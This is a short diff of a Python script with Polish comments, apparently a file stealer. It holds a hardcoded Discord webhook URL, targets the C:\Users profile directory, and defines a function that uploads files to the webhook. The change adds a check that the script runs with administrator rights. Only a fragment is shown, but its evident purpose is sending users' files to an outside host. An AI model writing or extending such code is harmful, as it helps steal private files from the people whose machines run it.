@@ -10,6 +10,11 @@ webhook_url_2 = "https://discord.com/api/webhooks/1322292531374854224/Fdl-C9RgDU
 # Ścieżka do katalogu z użytkownikami
 users_directory = r"C:\Users"
 
+# Funkcja do sprawdzania uprawnień
+if not os.access(users_directory, os.W_OK):
+    print("Brak wymaganych uprawnień. Uruchom skrypt jako administrator.")
+    sys.exit(1)
+
 # Funkcja do wysyłania pliku na Discord
 def send_file_to_discord(file_path, webhook_url):
     try:
